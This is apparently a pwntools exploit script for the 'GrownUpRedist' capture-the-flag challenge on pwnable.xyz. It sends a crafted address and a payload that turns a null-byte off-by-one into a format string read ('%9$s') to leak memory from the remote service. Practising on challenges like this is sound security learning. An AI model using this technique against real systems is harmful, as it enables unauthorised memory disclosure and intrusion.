#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './GrownUpRedist'
elf = ELF(binary)
libc = elf.libc

# io = process(binary, aslr = 0)
io = remote('svc.pwnable.xyz', 30004)
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

io.recvuntil("]: ")
addr = 0x601080
io.send('y\0\0\0\0\0\0\0' + p64(addr))

# null byte off by one -> format string bug
pay = 'a' * 0x20
pay += '%9$s'
pay = pay.ljust(0x80 , 'a')
io.recvuntil("Name: ")
io.send(pay)

io.interactive()
